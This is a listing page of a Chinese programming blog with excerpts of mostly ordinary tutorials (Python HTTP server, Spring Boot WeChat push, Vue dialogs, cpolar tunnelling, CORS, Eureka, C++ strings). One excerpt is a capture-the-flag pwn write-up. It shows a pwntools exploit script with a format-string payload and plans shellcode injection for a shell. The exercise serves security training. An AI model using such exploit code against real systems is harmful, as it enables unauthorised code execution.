学研君最喜欢的是第 5 章，在实战案例这一章中，万老师提供了卡通人物、UI 界面、产品设计、产品海报和 Logo 等实战案例。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea4f4fe615866d09de24a9d8c75ff401/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/068f74d54273c19d6b30f800f1b36f7b/" rel="bookmark">
			python 快速创建http服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要通过浏览器下载指定目录的文件，你可以使用HTTP服务器来提供文件的访问。以下是在Linux上使用Python的内置HTTP服务器快速搭建一个简单的HTTP服务器的步骤：
步骤 1: 进入目标目录 首先，打开终端，并使用cd命令进入你想要共享的目录，例如：
cd /path/to/your/directory 步骤 2: 启动HTTP服务器 在目标目录中，运行以下命令来启动一个简单的HTTP服务器：
对于Python 2：
python -m SimpleHTTPServer 8000 对于Python 3：
python3 -m http.server 8000 这将在本地计算机的8000端口上启动一个HTTP服务器。
步骤 3: 在浏览器中访问 打开你的浏览器，并在地址栏中输入以下地址：
http://your_server_ip:8000 替换 your_server_ip 为你的服务器的实际IP地址。然后，你应该能够在浏览器中看到列出目录中的文件。你可以点击文件名来下载指定的文件。
额外提示 防火墙设置: 如果系统上启用了防火墙，确保允许流量通过你选择的端口（在这个例子中是8000）。访问控制: 请注意，这种方法是以简单的方式提供文件访问，并没有提供用户认证或安全性控制。如果需要更多安全性，你可能需要考虑其他解决方案，例如使用Nginx或Apache HTTP服务器，并进行适当的配置。 使用Python内置的HTTP服务器能够快速搭建一个简单的HTTP服务器，以便于通过浏览器下载指定目录的文件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ccef01aeb5cdee1a23f0d35e78759982/" rel="bookmark">
			SpringBoot(JAVA)整合微信公众号消息推送
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网上那些都是零零碎碎的，不完整，重新整理下，代码可直接使用。
微信公众号消息推送大致分为两类，一是文本推送，二是带图片/视频推送。
文本推送很好理解，可以用模板消息以及自定义消息推送。
图文/视频推送就稍微麻烦些步骤分为 上传素材到临时/永久库-&gt;上传图文消息-&gt;消息推送。
贴几个官方文档，有总比没有好。
群发推送官网文档：https://developers.weixin.qq.com/doc/offiaccount/Message_Management/Batch_Sends_and_Originality_Checks.html
上传素材官方文档：https://developers.weixin.qq.com/doc/offiaccount/Asset_Management/New_temporary_materials.html
官方素材上传调试平台：https://mp.weixin.qq.com/debug/cgi-bin/apiinfo?t=index&amp;type=%E5%9F%BA%E7%A1%80%E6%94%AF%E6%8C%81&amp;form=%E5%A4%9A%E5%AA%92%E4%BD%93%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%8E%A5%E5%8F%A3%20/media/upload
一、文本推送 这里文本推送，可以采取模板和自定义推送内容。以下是模板方式推送，在图片/视频推送中会使用自定义内容推送演示。
首先需要在微信公众号上把测试的环境弄好。
点击开发者工具-&gt;公众平台测试账号。进去创建好对应的消息模板以及关注该测试的公众号。里面会有appID/appsecret，用户，模板以及能体验接口的信息，没有认证的微信号，有些接口是没有权限的，而且部分接口在没有认证的情况下每天都会有调用次数限制。
添加依赖，因为项目里面用了自己的http封装类，需替换下
&lt;dependency&gt; &lt;groupId&gt;com.squareup.okhttp3&lt;/groupId&gt; &lt;artifactId&gt;okhttp&lt;/artifactId&gt; &lt;version&gt;5.0.0-alpha.14&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.squareup.okio&lt;/groupId&gt; &lt;artifactId&gt;okio&lt;/artifactId&gt; &lt;version&gt;3.6.0&lt;/version&gt; &lt;/dependency&gt; WxToken
用于生成请求接口token
/** * 存储微信公众号Token的POJO类 * * @author zjw * @description */ public class WxToken { // 存储token信息 private String accessToken; // 10:00:00 // 12:00:00 // 存储当前的token有效期到什么时间点 private Long expire; public String getAccessToken() { // 获取token之前，需要先判断生存时间到了没 return expire == null || expire &lt; (System.currentTimeMillis() / 1000) ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ccef01aeb5cdee1a23f0d35e78759982/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9da36bce79a7eacaeac328b3b5edb29/" rel="bookmark">
			CesiumJS第3篇，前端使用Vue和Element实现可拖动弹框效果，并使用mixins混入特性实现，不影响底层元素操作（Cesium上可拖拽的实时视频播放弹框，底层元素可以正常操作）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简述：在前端开发中，弹框和实时视频播放是常见的需求。这里来简单记录一下，如何使用Vue.js和Element UI实现一个可拖动的弹框，并使用mixins混入特性，在组件中播放实时视频。同时，确保在拖拽弹框时，底层元素仍然可以操作。这里来记录一下 Cesium ～ 第 3 篇 —— Cesium上可拖拽的实时视频弹框 一、项目初始化，以Vue项目为例 首先，确保你的项目已经安装了Element UI。如果没有安装，可以使用以下命令进行安装并注册：
npm install element-ui
// 或者
cnpm install element-ui
二、创建Vue组件 这里我们创建一个包含实时视频播放功能的弹框组件。这个组件将使用Element UI的el-dialog组件，并添加拖动功能，同时添加CSS代码。确保在拖拽时底层元素可以操作。
1. 弹框组件 &lt;template&gt; &lt;!-- 弹出框 --&gt; &lt;el-dialog title="实时视频播放" :visible.sync="dialogVisible" width="30%" :before-close="handleClose" :modal="false" :close-on-click-modal="false" class="cesium_dialog" &gt; &lt;flvVue :Url="rtsp1" v-if="dialogVisible"&gt;&lt;/flvVue&gt; &lt;span slot="footer" class="dialog-footer"&gt; &lt;/span&gt; &lt;/el-dialog&gt; &lt;/template&gt; &lt;script&gt; export default { data() { return { dialogVisible: false, // 弹框显示状态 rtsp1: 'rtsp://your-stream-url' // 实时视频流地址 }; }, methods: { // 打开弹框事件 DialogOpen(RtspUrl) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c9da36bce79a7eacaeac328b3b5edb29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdc258e73e13a7e8e6bfb76f96152f4b/" rel="bookmark">
			如何使用可道云结合内网穿透工具实现远程访问打造私人云盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.前言2. Kodcloud网站搭建2.1. Kodcloud下载和安装2.2 Kodcloud网页测试 3. cpolar内网穿透的安装和注册4. 本地网页发布4.1 Cpolar云端设置4.2 Cpolar本地设置 5. 公网访问测试6.结语 💡 推荐 前些天发现了一个巨牛的人工智能学习网站，通俗易懂，风趣幽默，忍不住分享一下给大家。【点击跳转到网站】
1.前言 本文主要为大家介绍一款国人自研的在线Web文件管理器可道云，能够支持在线管理图片、播放音乐视频、编辑和查看文件等，再将其与cpolar的内网穿透工具结合，就能让我们轻松的打造一个可以远程访问的私人云盘。
云存储作为近些年兴起的概念，成功吸引了各大互联网厂商下场，也将“集中存储，分别调用”的概念普及到广大的互联网用户心中，构建数据集中存储中心的设备和软件也迎来一波爆发。
本来云存储很有发展前景，但各大厂的蜜汁操作直接断送了其在云存储范畴的发展前景，反而让私人数据中心和软件发展进入快车道。专业的数据存储中心有很多中，但也很贵；好在还有各种基于Web的文件管理功能，能将我们家里的电脑，轻松改造为个人数据存储中心。
2. Kodcloud网站搭建 可道云是一款国内人员研发的Web文件管理器，能够支持在线管理图片、播放音乐视频、编辑和查看文件等等功能，而且其操作页面也很友好，其操作页面与Windows的资源管理器界面类似，没有使用界面的陌生感。最重要的是，作为国人研发的Web文件管理器，对中文能够完美支持。
2.1. Kodcloud下载和安装 首先我们登录Kodcloud的官网（kodcloud.com/），下载Kodcloud的服务器端。
Kodcloud服务器端下载完成后，将其解压至网页运行环境中。笔者使用的网页运行环境是小皮面板，因此将解压后的kodcloud文件放置在www文件夹下。
接着，打开小皮面板的“网站”界面，点击左上方创建网站按钮：
域名：用于本地访问时的域名端口网页输出端口根目录Kodcloud文件存放的位置创建环境FTP、数据库之类 完成这些内容填写后，就可以点击下方的确认按钮，创建可道云的本地网页（要记得打开PHP的DTP拓展，在小皮面板对应网页的“管理”项中可找到）。
在网页创建完毕后，我们在浏览器中输入域名:端口号（或127.0.0.1:83），就能打开可道云服务器端的安装页面
进入可道云的安装页面，软件会对安装环境进行自检，只有自检通过后，才能进行下一步。
数据库页面我们没有什么可以设置的，直接点确定即可。最后，我们设置管理员账号和密码，即可完成可道云的网页服务器安装。
2.2 Kodcloud网页测试 完成以上的网页程序安装后，可道云会自动跳转至用户登录界面，我们直接登录即可。
这一步可以看做是我们对可道云是否安装成功，能否正常访问的测试，只要能正常登录，就说明我们成功的在本地电脑上安装了可道云。
下一步，我们就可以继续安装Cpolar，并使用Cpolar创建的内网穿透数据隧道，为本地安装的可道云生成一个公共互联网地址，让我们能在公共互联网上，访问到本地电脑上的各种文件资料。
3. cpolar内网穿透的安装和注册 相比可道云服务器的页面安装，cpolar的安装要简单很多。可以直接在cpolar的官网页面（https://www.cpolar.com/）找到下载按钮。
笔者使用的是Windows操作系统，因此选择Windows版本进行下载。
Cpolar下载完成后，将下载的文件解压，双击解压后的.msi文件，即可自动执行安装程序。接着只要一路“Next”就能完成安装。
由于cpolar会为每个用户创建独立的数据隧道，并以用户密码和token码保证数据安全。因此我们在使用cpolar之前，需要进行注册。而注册过程也很简单，只要在cpolar主页右上角点击“用户注册”，并填入几项必要信息，就能完成注册。
4. 本地网页发布 到这一步，我们完成了可道云服务器的本地页面测试，也安装了注册了cpolar，下一步，我们就可以着手创建内网穿透数据隧道，为本地可道云创建一个公共互联网地址。
4.1 Cpolar云端设置 个人数据中心讲求的是长期稳定可访问，笔者并不想每天更新公共互联网地址设置（cpolar免费版的数据隧道每24小时重置一次），因此笔者将cpolar升级至vip版，以便能获得能长期稳定存在的内网穿透数据隧道。
要设置能够长期稳定的内网穿透数据隧道，需要先登录cpolar的官网（免费版不必在cpolar云端设置，可直接在客户端设置），并在用户主页面左侧找到预留按钮，并点击进入cpolar的数据隧道预留页面。
在这里生成一个公共互联网地址（也可以看做数据隧道的入口），由于此时这个地址没有连接本地的软件输出端口，因此也可以看做是一条空白的数据隧道。
在预留页面，可以看到很多种可保留的数据隧道，这里我们选择保留二级子域名栏位。
在“保留二级子域名”栏位，需要进行几项信息的简单设置，即：
地区：服务器所在区域，就近选择即可二级域名：会最终出现在生成的公共互联网地址中，作为网络地址的标识描述：可以看做这条数据隧道的描述，能够与其他隧道区分开即可 完成这几项设置后，就可以点击右侧的“保留”按钮，将这条数据隧道保留下来。
当然，如果这条数据隧道不打算再使用，还可以点击右侧的“x”将其轻松删除，节约宝贵的隧道名额。
4.2 Cpolar本地设置 完成cpolar云端的设置，保留了好空白数据隧道后，就能回到本地的cpolar客户端，将云端生成的空白数据隧道与本地的测试页面连接起来。
在本地打开并登录cpolar客户端（可以在浏览器中输入localhost:9200直接访问，也可以在开始菜单中点击cpolar客户端的快捷方式）。
点击客户端主界面左侧“隧道管理”项下的“创建隧道”按钮，进入本地隧道创建页面（如果要创建没24小时重置地址的临时数据隧道，可直接在此进行设置，不必再cpolar官网设置空白数据隧道）。
在这个页面，同样需要进行几项信息设置，这些信息设置包括：
1. 隧道名称 – 可以看做cpolar本地的隧道信息注释，只要方便我们分辨即可；2. 协议 – 由于可道云页面是网页形式，因此选择http协议；3. 本地地址 – 本地地址即为本地网站的输出端口号，因此这里填入83号；4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fdc258e73e13a7e8e6bfb76f96152f4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/579efe0e57ef1de70fa3f53f96f5db4c/" rel="bookmark">
			彻底搞懂前端跨域&amp;解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1浏览器的同源策略
1.1同源策略概述
1.2什么是源（origin）？
2跨域会受到哪些限制
2.1限制DOM访问
2.2限制Cookie访问
2.3限制Ajax获取数据
3几个注意点 4CORS 解决 Ajax 跨域问题
4.1CORS 概述
4.2CORS 解决简单请求跨域
4.3简单请求与复杂请求
4.4CORS 解决复杂请求跨域
4.5借助 cors 库快速完成配置
5JSONP 解决跨域问题
6配置代理解决跨域
6.1自己配置代理服务器
6.2使用 Nginx 搭建代理服务器
6.3借助脚手架搭建服务器 代码地址 git clone https://gitee.com/childe-jia/cross-domain-test.git
1浏览器的同源策略 1.1同源策略概述 同源策略是浏览器为确保资源安全，而遵循的一种策略，该策略对访问资源进行了一些限制。
W3C 上对同源策略的说明：Same origin policy。
1.2什么是源（origin）？ 1源的组成部分
2下面表格中，只有最后一行的两个源是同源。
源 1
源 2
是否同源
http://www.xyz.com/home
https://www.xyz.com/home
⛔非同源️
http://www.xyz.com/home
http://mail.xyz.com/home
⛔非同源
http://www.xyz.com:8080/home
http://www.xyz.com:8090/home
⛔非同源
http://www.xyz.com:8080/home
http://www.xyz.com:8080/search
✅同 源︎
3同源请求
4非同源请求
5总结:『所处源』与『目标源』不一致，就是『非同源』，又称『异源』或『跨域』
2跨域会受到哪些限制 例如有两个源：『源A』和『源B』，它们是『非同源』的，那么浏览器会有如下限制：
2.1限制DOM访问 『源A』的脚本不能访问『源B』的 DOM。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/579efe0e57ef1de70fa3f53f96f5db4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33714953dfd3260879921a412e78508d/" rel="bookmark">
			攻防世界 string
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		国际惯例file,checksec一下，发现是64位的elf文件，不可修改got表，栈溢出保护开启，nx不可执行，没开地址随机化
这道题的流程比较复杂，交互较多，所以我们需要先分析清楚整个流程
拖入64位ida，shift+f12没发现什么有用的东西，直接分析程序，我只简单说，你们看不懂伪代码的直接丢ai看
sub_400996()函数内容就是输出我们下面交互界面的字符串和那条龙(运行不了文件chmod给它执行权限即可)
sub_400D72()内容
sub_400D72()中第一个函数内容
输入east后下面显示的内容和上面if分支里面sub_4009DD()函数内容没啥关系我就不看了
上面east后的内容是下面这个函数的
第三个函数
第三个函数内容主要是让主程序给的两个数相等，它们原本不相等，但我们可以利用上面的格式化字符串漏洞修改使其中一个数等于另外一个
mmap函数分配内存空间，我们输入的数据也是放在里面，权限7带有执行权限。
read函数从v1我们输入的数据中读取至多0x100位数据
((void (__fastcall *)(_QWORD))v1)(0LL); 这行代码将v1所指向的内存地址作为函数指针，并以0LL为参数调用该函数。如果之前通过read读入的数据实际上是一个可执行代码（即shellcode），并且mmap时设置了适当的执行权限，那么这里就会执行那段shellcode。
所以我们的解题思路出来了，利用格式化字符串漏洞将v4写成85即可进入sub_400CA6函数，随后注入shellcode代码获得shell
运行程序手动调试输入AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p来查找输入数据在格式化字符串中的参数位置为7(从0开始的的)
可以写脚本了，注释在代码里面
from pwn import * sh = remote('61.147.171.105',58910) sh.recvuntil("secret[0] is") firstNumber_addr = int(sh.recvuntil("\n")[:-1],16) #这里前面说过了，v4是一个指向_DWORD（32位）的指针， #因此printf函数将会输出v4第一个数所指向的内存地址的十六进制表示 #利用[:-1]python切片去掉接收数据的换行符\n，再用int(a,16)强制转换为int型 sh.sendlineafter("What should your character's name be:","thomas") sh.sendlineafter("So, where you will go?east or up?:","east") sh.sendlineafter("go into there(1), or leave(0)?:","1") sh.sendlineafter("'Give me an address'",str(firstNumber_addr)) #将v4第一个数的地址强制转换为str发送，指针指向该处地址 payload = '%85x%7$n' #前面已经知道在格式化字符串漏洞中输出wish参数位置为7，%7$n将前面字符的个数%85x共占位85字符即将85输入到参数中 sh.sendlineafter("And, you wish is:",payload) #使用payload = b'a'*85 + '%7$n'也可以 context(os="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33714953dfd3260879921a412e78508d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a6cdab914ff15a2d392433364072b45/" rel="bookmark">
			【微服务】SpringCloud-eureka光速入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringCloud-eureka光速入门
一、Eureka 主要组件
二、工作流程
三、优势
四、Eureka-光速入门【重点】
4.1 案例准备
4.1.1 创建父工程 tingyi-shop
4.1.2 创建子工程 tingyi-goods
4.1.3 创建子工程 tingyi-order
4.1.4 案例调整
4.1.4.1 在order模块创建 RestTemplate对象
4.1.4.2 修改OrderController
4.1.4.2 重启并测试
4.2 为什么使用eureka
4.2 Eureka光速入门
4.2.1 创建EurekaServer
4.2.2 调整商品模块
4.2.3 调整订单模块
4.2.4 调整订单模块， 调用商品模块
4.2.4 测试
4.3 Eureka的安全性
4.4 Eureka的高可用
4.4.1 配置以及代码
4.4.2 测试
4.4.3 Eureka的细节
🎈边走、边悟🎈迟早会好
Eureka 是 Netflix 开源的一个服务注册和发现工具，主要用于构建分布式系统中的服务发现机制。它在 Spring Cloud 生态系统中广泛使用，尤其在微服务架构中扮演重要角色。
一、Eureka 主要组件 Eureka Server:
作为服务注册中心，负责管理服务实例的注册和心跳检测。服务实例在启动时向 Eureka Server 注册，并定期发送心跳以保持注册信息的有效性。Eureka Server 通常部署为集群，确保高可用性和容错性。 Eureka Client:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a6cdab914ff15a2d392433364072b45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/769018fbed34a7e14fb6b49283dc3a7b/" rel="bookmark">
			生成一个完整的购物商城代码跨越多种编程语言会非常复杂，因为每个部分（前端、后端、数据库）通常会使用最适合该任务的特定语言或框架。不过，我可以为你提供一个简化的概述，以及每个部分可能使用的示例代码片段。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前端 (HTML/CSS/JavaScript + React)
React 组件示例 (ProductList.jsx)1000sheng.com jsx
import React, { useState, useEffect } from ‘react’;
import axios from ‘axios’;
function ProductList() {
const [products, setProducts] = useState([]);
useEffect(() =&gt; { axios.get('/api/products') .then(response =&gt; setProducts(response.data)) .catch(error =&gt; console.error('Error fetching products:', error)); }, []); return ( &lt;div&gt; &lt;h1&gt;Product List&lt;/h1&gt; &lt;ul&gt; {products.map(product =&gt; ( &lt;li key={product.id}&gt;{product.name} - ${product.price}&lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; ); }
export default ProductList;
2. 后端 (Node.js + Express)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/769018fbed34a7e14fb6b49283dc3a7b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b608dad5d930ec5af66c82cb42d9a168/" rel="bookmark">
			C&#43;&#43;心决之stl中那些你不知道的秘密(string篇)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 为什么学习string类？
1.1 C语言中的字符串
2. 标准库中的string类
2.1 string类
2.2 string类的常用接口说明
1. string类对象的常见构造
2. string类对象的操作
3.vs和g++下string结构的说明
3. string类的模拟实现
3.2 浅拷贝
3.3 深拷贝
3.4 写时拷贝
3.5 string类的模拟实现
1. 为什么学习string类？ 1.1 C语言中的字符串 C 语言中，字符串是以 '\0' 结尾的一些字符的集合，为了操作方便， C 标准库中提供了一些 str 系列的库函数， 但是这些库函数与字符串是分离开的，不太符合OOP 的思想，而且底层空间需要用户自己管理，稍不留神可 能还会越界访问。 2. 标准库中的string类 2.1 string类 https://cplusplus.com/reference/string/string/?kw=string
1. 字符串是表示字符序列的类 2. 标准的字符串类提供了对此类对象的支持，其接口类似于标准字符容器的接口，但添加了专门用于操作 单字节字符字符串的设计特性。 3. string类是使用char(即作为它的字符类型，使用它的默认char_traits和分配器类型(关于模板的更多信 息，请参阅basic_string)。 4. string类是basic_string模板类的一个实例，它使用char来实例化basic_string模板类，并用char_traits 和allocator作为basic_string的默认参数(根于更多的模板信息请参考basic_string)。 5. 注意，这个类独立于所使用的编码来处理字节:如果用来处理多字节或变长字符(如UTF-8)的序列，这个 类的所有成员(如长度或大小)以及它的迭代器，将仍然按照字节(而不是实际编码的字符)来操作。 总结： 1. string是表示字符串的字符串类 2. 该类的接口与常规容器的接口基本相同，再添加了一些专门用来操作string的常规操作。 3. string在底层实际是：basic_string模板类的别名，typedef basic_string&lt;char, char_traits, allocator&gt; string; 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b608dad5d930ec5af66c82cb42d9a168/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32f5571f98eef473004d35783081e92d/" rel="bookmark">
			Web3 社交领域的开发技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Web3 社交领域的开发技术主要包括以下几种，随着 Web3 技术的不断发展，Web3 社交领域将会出现更多新的技术和应用场景。北京木奇移动技术有限公司，专业的软件外包开发公司，欢迎交流合作。
1. 区块链技术
区块链技术是 Web3 社交的核心技术，它为去中心化、安全和透明的社交网络提供了基础。在 Web3 社交领域，区块链技术主要应用于以下方面：
用户身份管理: 利用区块链技术存储用户身份信息，确保用户身份的可信和安全。社交关系管理: 利用区块链技术存储用户之间的社交关系，实现去中心化的社交图谱。内容存储和发布: 利用区块链技术存储社交内容，确保内容的不可篡改和可追溯性。激励机制: 利用区块链技术构建激励机制，鼓励用户参与社交活动。 2. 加密技术
加密技术是 Web3 社交的重要辅助技术，它为用户数据和隐私安全提供了保障。在 Web3 社交领域，加密技术主要应用于以下方面：
用户数据加密: 对用户数据进行加密存储，防止数据泄露。私钥管理: 用户使用私钥管理自己的账户和资产，确保账户安全。安全通信: 利用加密技术实现安全通信，防止信息泄露。 3. 分布式存储
分布式存储技术是 Web3 社交的重要基础设施，它为社交内容的存储和分发提供了高效、可靠的解决方案。在 Web3 社交领域，分布式存储技术主要应用于以下方面：
社交内容存储: 将社交内容存储在分布式存储网络中，避免单点故障。内容分发: 利用分布式存储技术实现内容分发，提高内容访问速度和效率。 4. 人工智能
人工智能技术是 Web3 社交的未来发展方向，它可以为用户提供更加个性化和智能化的社交体验。在 Web3 社交领域，人工智能技术主要应用于以下方面：
内容推荐: 利用人工智能技术为用户推荐感兴趣的内容，提高用户参与度。社交分析: 利用人工智能技术分析社交数据，发现社交趋势和用户需求。虚拟助手: 开发虚拟助手，为用户提供更加便捷的社交服务。 5. 其他技术
除了上述技术之外，Web3 社交领域还可能会用到其他一些技术，例如：
云计算: 利用云计算技术提供弹性可扩展的基础设施。大数据: 利用大数据技术分析用户行为和社交数据。物联网: 将物联网技术与社交网络结合，打造更加智能化的社交体验。 以下是一些 Web3 社交领域的开发项目示例：
Diaspora: Diaspora 是一个去中心化的社交网络，用户可以控制自己的数据和隐私。Mastodon: Mastodon 是另一个去中心化的社交网络，类似于 Twitter。Steemit: Steemit 是一个基于区块链的社交内容平台，用户可以通过发布内容获得奖励。DTube: DTube 是一个基于区块链的视频分享平台，用户可以控制自己的视频内容和版权。 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/163/">«</a>
	<span class="pagination__item pagination__item--current">164/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/165/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>